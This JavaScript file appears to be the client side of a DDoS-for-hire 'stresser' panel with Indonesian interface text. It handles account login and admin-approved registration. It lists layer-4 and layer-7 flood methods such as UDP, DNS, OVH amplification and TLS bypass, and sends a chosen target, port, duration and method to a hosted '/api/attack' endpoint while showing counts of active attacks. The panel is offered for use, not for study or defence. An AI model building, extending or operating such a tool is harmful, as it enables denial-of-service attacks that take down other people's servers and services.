const BASE = 'https://syafrialp.onrender.com';
let isAdmin = false;

function login() {
  const user = document.getElementById('user').value;
  const pass = document.getElementById('pass').value;

  fetch(BASE + '/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user, pass })
  })
  .then(res => res.json())
  .then(data => {
    if (!data.allowed) return alert('Belum di-approve oleh admin');
    document.getElementById('login').classList.add('hidden');
    document.getElementById('attack').classList.remove('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    if (data.isAdmin) {
      isAdmin = true;
      document.getElementById('admin').classList.remove('hidden');
    }
    loadStats();
  })
  .catch(() => alert('Login gagal'));
}

function register() {
  const user = document.getElementById('regUser').value;
  const pass = document.getElementById('regPass').value;
  const captcha = document.getElementById('captcha').value;
  if (captcha != '7') return alert('Captcha salah');

  fetch(BASE + '/api/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user, pass })
  })
  .then(res => res.json())
  .then(data => alert('Berhasil daftar, tunggu approval admin'))
  .catch(e => alert('Gagal daftar'));
}

function showRegister() {
  document.getElementById('login').classList.add('hidden');
  document.getElementById('register').classList.remove('hidden');
}

function showLogin() {
  document.getElementById('register').classList.add('hidden');
  document.getElementById('login').classList.remove('hidden');
}

function loadMethods() {
  const layer = document.getElementById('layer').value;
  const method = document.getElementById('method');
  method.innerHTML = '';

  const methods = {
    layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"],
    layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"]
  };

  if (methods[layer]) {
    methods[layer].forEach(m => {
      const opt = document.createElement('option');
      opt.value = m;
      opt.innerText = m.toUpperCase();
      method.appendChild(opt);
    });
  }
}

function sendAttack() {
  const target = document.getElementById('target').value;
  const port = document.getElementById('port').value;
  const time = document.getElementById('time').value;
  const method = document.getElementById('method').value;

  fetch(BASE + '/api/attack', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ target, port, time, method })
  })
  .then(res => res.json())
  .then(data => alert('Attack sent: ' + JSON.stringify(data)))
  .catch(e => alert('Error: ' + e.message));
}

function createUser() {
  if (!isAdmin) return alert('Bukan admin');

  const newUser = document.getElementById('newUser').value;
  const newPass = document.getElementById('newPass').value;

  fetch(BASE + '/api/create-user', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      adminUser: document.getElementById('user').value,
      adminPass: document.getElementById('pass').value,
      newUser, newPass
    })
  })
  .then(res => res.json())
  .then(data => alert('User created'))
  .catch(e => alert('Gagal create user'));
}

function loadStats() {
  fetch(BASE + '/api/stats')
    .then(res => res.json())
    .then(data => {
      document.getElementById('stat-now').innerText = 'Attack Aktif: ' + data.now;
      document.getElementById('stat-today').innerText = 'Hari Ini: ' + data.today;
      document.getElementById('stat-month').innerText = 'Bulan Ini: ' + data.month;
    });
}
